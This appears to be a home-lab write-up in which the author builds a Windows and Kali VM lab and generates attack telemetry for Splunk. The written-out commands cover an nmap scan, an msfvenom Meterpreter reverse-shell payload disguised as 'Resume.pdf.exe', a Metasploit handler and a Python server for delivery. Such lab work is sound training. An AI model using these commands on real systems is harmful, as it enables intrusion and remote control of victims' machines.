# Home Lab Setup & SIEM Implementation

## Objective

The Home Lab Setup & SIEM Implementation project is aimed to establish a controlled environment for simulating and detecting cyber attacks and to test various cybersecurity tools. I set up a home lab using two virtual machines using VMWare as the hypervisor. My host machine is a MacBook Pro M2 Max. VMs also allow the ability conduct these tests in a controlled environment without causing harm to the host machine.

The primary focus of this lab was to set up a test environment and to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen my understanding of network security, attack patterns, and defensive strategies. 

### Skills Learned

- Advanced understanding of SIEM concepts and practical application
- Proficiency in analyzing and interpreting network logs
- Ability to generate and recognize attack signatures and patterns
- Enhanced knowledge of network protocols and security vulnerabilities
- Development of critical thinking and problem-solving skills in cybersecurity
- Advanced understanding of setting up virtual machine hypervisor
- Installation of Microsoft Windows 11 client and Kali Linux client
- Network configuration to enable the virtual machines to communicate

### Tools Used

- Security Information and Event Management (SIEM) system for log ingestion and analysis
- Penetration testing tools (such as Metasploit) to conduct security vulnerability tests
- Telemetry generation tools to create realistic network traffic and attack scenarios

## Steps

<img width="1136" alt="1" src="https://github.com/user-attachments/assets/9a566379-2518-4be5-a374-bc85db733478" />

In the screenshot above, I show the two VMs I created and hosted in VMWare. I installed Kali Linux for ARM architectures as well as Windows 11 ARM since the host machine I am on is an Apple MacBook Pro with the M2 Max CPU. Each of the VMs are configured with 4GB of RAM, 50GB storage space, as well as 2 CPUs (processor cores). The two VMs are on the same network as administered by VMWare & the host machine through NAT. This way, both VMs can see one another. The IP addresses of both VMs will need to be statically assigned so that each VM will be able to see the other one.

<img width="2560" alt="2" src="https://github.com/user-attachments/assets/5695af4a-599a-4f69-b0ad-0237d2aa5c9e" />

In the Windows 11 VM, I statically assign the IP address to 192.168.20.10. The subnet mask defaults to 255.255.255.0.

<img width="2560" alt="3" src="https://github.com/user-attachments/assets/f7377ec2-e3d0-4880-b8ab-f32f7529c77f" />

I open the Command Prompt and type ipconfig to bring up the Windows IP configuration. This is to verify that the IPv4 address has been changed.

<img width="2560" alt="4" src="https://github.com/user-attachments/assets/d500c42a-af0f-42a8-87af-c2797eee2e2c" />

In the Kali Linux VM, I statically assign the IP address to 192.168.20.11. The subnet mask defaults to 255.255.255.0.

<img width="2560" alt="5" src="https://github.com/user-attachments/assets/d32ff489-6be1-4021-a6b4-d826d6da477b" />

I open the Terminal and type ifconfig to bring up the internet configuration. This is to verify that the IPv4 address has been changed. Next, I ping the Windows VM by typing ping 192.168.20.10 but see that it will not work since Windows Firewall is blocking the incoming traffic.

<img width="2560" alt="6" src="https://github.com/user-attachments/assets/4f6b8c13-215b-4e8d-b83e-19ea40c8d1ec" />

In the Windows VM, I type ping 192.168.20.11 in Command Prompt to ping the Kali Linux VM. This shows activity in Command Prompt and verifies that both VMs can communicate with one another. 

<img width="2560" alt="3 1" src="https://github.com/user-attachments/assets/7187ec61-80d8-46eb-9932-d1f504b16ba2" />

Next, I took note of the IP address of my Kali Linux machine that will be used in building the malware. The IP address is obtained by typing ifconfig in the Terminal. 

<img width="2560" alt="3 2" src="https://github.com/user-attachments/assets/93217f8f-4614-4328-8981-ff8641c57938" />

Next, in the Terminal, I type nmap -A 192.168.20.10 -Pn. My Windows machine is on the IP address ending in .10. Nmap scans all the ports and will scan them. -Pn skips pings. After Nmap runs, the results return showing that port 3389 for RDP is open on the Windows machine.

<img width="2560" alt="3 3" src="https://github.com/user-attachments/assets/bfebb106-9f86-4644-9846-7b72e4f4c066" />

In Terminal, I type msfvenom -l payloads to view the list of midterpreters that can be used as the payload. The one I selected is windows/x64/meterpreter_reverse_tcp.

<img width="2560" alt="3 4" src="https://github.com/user-attachments/assets/ddf263fa-85cb-4dd8-84b8-b9e731191f88" />

Next, in Terminal, I type msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe. This command generates malware using meterpreter’s reverse TCP payload which is instructed to connect back to a machine based on the L host and L port. The file format is an .exe format as specified and the file name will be Resume.pdf.exe.

<img width="2560" alt="3 5" src="https://github.com/user-attachments/assets/6f223fdd-72e6-472e-94cf-243cd94815a9" />

After running the command, I type ls in Terminal to verify that the file has been created by printing out the contents of the current directory.

<img width="2560" alt="3 6" src="https://github.com/user-attachments/assets/6db034ed-3a62-4d46-b722-108df800d888" />

Metasploit is opened by typing msfconsole in Terminal. The multihandler is used by typing use exploit/multi/handler. This allows the user to be in the exploit itself.

<img width="2560" alt="3 7" src="https://github.com/user-attachments/assets/bc9597fb-2158-406a-bf29-6246c5813286" />

In Terminal, I type options to see what can be configured. The payload option is currently generic/shell_reverse_tcp. This is changed so that it is the same payload as used when the malware is configured and msfvenom. To change the payload, I type set payload windows/x64/meterpreter/reverse_tcp.

<img width="2560" alt="3 8" src="https://github.com/user-attachments/assets/9f5c6dc5-ed52-4183-a733-a97d6f68e10e" />

I type options in Terminal again to verify that the payload option was changed to Windows x64 meterpreter reverse TCP. 

<img width="2560" alt="3 9" src="https://github.com/user-attachments/assets/675e6ad2-a77c-4321-927b-da3f1579baa1" />

Afterwards, the LHOST should is changed to the attacker machine which is the IP address of the Kali Linux machine. I type set lhost 192.168.20.11 in Terminal. Afterwards, I type options to verify that the change took place.

<img width="2560" alt="3 10" src="https://github.com/user-attachments/assets/bf37c294-d86b-4a9c-b6a5-ab77f3072ce0" />

Next, in Terminal, I typed exploit to start the handler and so that we can listen for the test Windows machine to execute the malware. 

<img width="2516" alt="3 11" src="https://github.com/user-attachments/assets/c7cf07b6-7bbd-4aad-9034-7e4845546ff5" />

Next, I set up an HTTP server on the Kali Linux machine so the test Windows machine can download the malware. I use Python to execute the command. In Terminal, I type python3 -m http.server 9999. I chose a port that is not in use, which in this case is 9999. This allows the Windows machine to access the Kali Linux machine in order to download the malware file.

<img width="2560" alt="3 12" src="https://github.com/user-attachments/assets/07ddb9ed-2874-4d6d-8af5-67551ecbe866" />

Next, I move over to the Windows VM and disable Microsoft Defender. Afterwards, I open up a web browser and type in the Kali Linux VM IP address of 192.168.20.11:9999. 

<img width="2560" alt="3 13" src="https://github.com/user-attachments/assets/2101748a-2ded-4c96-bba9-20030a5ed034" />

Next, I download the file from the website and try to open the file. After the file runs, I open up Command Prompt with admin privileges and type netstat -anob. I scroll through the list to find an established connection with the Kali Linux machine and see that it is listed as TCP 192.168.20.11:4444.

<img width="2516" alt="3 14" src="https://github.com/user-attachments/assets/a573de8d-6fd6-49ac-b02e-cb2e96a78c3b" />

To verify that the process is running, I open Task Manager and search for the Resume.pdf.exe by typing in its Process ID (PID) in Task Manager.

<img width="2560" alt="3 15" src="https://github.com/user-attachments/assets/3a30e3d3-2d36-4015-a3d7-973e8009bb9a" />

Back in the Kali Linux VM, I type in shell to establish a shell on the Windows VM. Afterwards, I type net user, net localgroup, and ipconfig. 

<img width="2560" alt="3 16" src="https://github.com/user-attachments/assets/29dc8bd1-f3cb-4109-85c8-b9fe5d5e9738" />
<img width="2560" alt="3 17" src="https://github.com/user-attachments/assets/b764e738-1ab4-4b13-ad02-6318f476d088" />

Lastly, I go back to the Windows VM to see what kind of telemetry has been generated. I go to Splunk.com and log into my account. In the search bar, I type index=endpoint and populate the results. The results then show me the data that was captured from the file transfer that is analyed and a decision is made on the next steps to take.

